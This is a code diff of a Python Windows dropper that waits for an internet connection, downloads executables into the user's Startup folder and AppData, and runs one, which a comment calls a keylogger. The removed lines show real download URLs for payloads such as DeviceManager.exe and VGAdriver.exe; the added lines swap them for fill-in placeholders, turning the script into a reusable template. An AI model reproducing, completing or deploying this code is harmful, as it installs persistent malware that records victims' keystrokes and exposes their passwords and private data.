@@ -5,6 +5,7 @@ import subprocess
 
 import win32event, win32api, winerror
 
+#loop until internetconnection success
 def wait_for_internet_connection():
     while True:
         try:
@@ -18,20 +19,19 @@ mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
 
-
+#set download path
 home = os.path.expanduser("~")
 path = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
 path=home+path
+
 wait_for_internet_connection()
 try:
-    urllib.urlretrieve("http://6n0.me/DeviceManager.exe",path+"\\DeviceManager.exe")
-    urllib.urlretrieve("http://15.ss.shared.com/rfb6f7b6ku?tmp=1423975406&key=dbaacea3cb6fb93ee72bd137a384528d17b2e9cd",home+"\\AppData\\Roaming\\VGAdriver.exe")
-    #urllib.urlretrieve("http://6n0.me/hstart.exe",home+"\\AppData\\Roaming\\hstart.exe")
-    #urllib.urlretrieve("http://6n0.me/hstart64.exe",home+"\\AppData\\Roaming\\hstart64.exe")
-    #urllib.urlretrieve("http://6n0.me/startup.bat",path+"\\startup.bat")
+    urllib.urlretrieve("http://where your file is ?",path+"\\name the file.exe")
+    urllib.urlretrieve("http://where your file is ?",home+"\\where\\you want to keep\\file.exe")
+    
 except:
     pass
 
-command=str(home)+"\\AppData\\Roaming\\VGAdriver.exe"
-print(command)
+#run keylogger
+command=str(home)+"\\AppData\\Roaming\\file.exe"
 subprocess.call(command,shell=True)
